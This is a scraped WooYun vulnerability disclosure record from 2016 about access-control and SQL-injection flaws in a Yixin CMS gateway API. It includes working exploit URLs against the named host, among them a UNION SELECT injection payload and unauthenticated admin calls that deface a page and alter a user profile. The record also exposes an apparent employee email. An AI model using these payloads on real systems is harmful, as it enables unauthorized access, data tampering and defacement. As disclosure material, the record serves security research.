{"id": 86324, "wybug_id": "wooyun-2016-0188349", "wybug_title": "宜信某站api接口访问控制不当加SQL注入", "wybug_corp": "宜信", "wybug_author": "学习委员", "wybug_date": "2016-03-24 09:22", "wybug_open_date": "2016-05-08 09:37", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向公众公开  简要描述： 人生真是寂寞如雪！ 详细说明：  概述：还是这个站  WooYun: 宜信某站SQL注入绕过加速乐  上次的乐趣主要在于绕过WAF。而这次没什么乐趣，只是觉得它还存在不少问题，这个程序感觉很奇葩。这里有一个接口 http://brcms.yixin.com/s/gateway/index.php\n\n它有两个重要的参数：gateway_destination:\"服务器要调用的目标类\"func_name:\"服务器要调用的目标方法\"通过查看 html 文件和 JavaScript 文件的源代码你可以获取调用该接口所需的参数。举个例子，http://brcms.yixin.com/s/gateway/index.php?gateway_destination=activity_honored_guest_talk/admin/GetList&func_name=GetList&activity_id=1\n\n这个接口有两个问题，一是有些敏感功能对匿名用户开放，二是存在SQL注入。用以上例子证明注入，再次说明不能要依赖WAF。\n\n除了这个接口，还有另一个注入点 http://brcms.yixin.com/inter-action-single.htm?id=115.0UNION SELECT 1,2,3,4,5,6,7,8,9,10,(user%09%23%0A%20())\n\n怎么说该接口访问控制不当？如下例子，不好意思修改了你们的页面\nhttp://brcms.yixin.com/s/gateway/index.php?gateway_destination=ii%2Finteractive_honored_guest%2Fadmin%2FUpdate&func_name=Update&interactive_id=10&id=7&name=学习委员&face=1437108379.jpg&title=wooyun：学习委员——人生真是寂寞如雪&guest_title=wooyun&description=我叫学习委员\n\n\n还可以修改用户的个人信息等等，不一一列举了。\nhttp://brcms.yixin.com/s/gateway/index.php?gateway_destination=user/updateUserInfo&func_name=updateUserInfo&nickname=张三&name=wooyun&email=shijunsun@creditease.cn&uid=27&birthday=19930911&job=boss&gender=1\n   漏洞证明：  已证明，如上   修复方案：  信不信问题还有！   版权声明：转载请注明来源 学习委员@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-03-24 09:37 厂商回复： 感谢提醒，正在修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}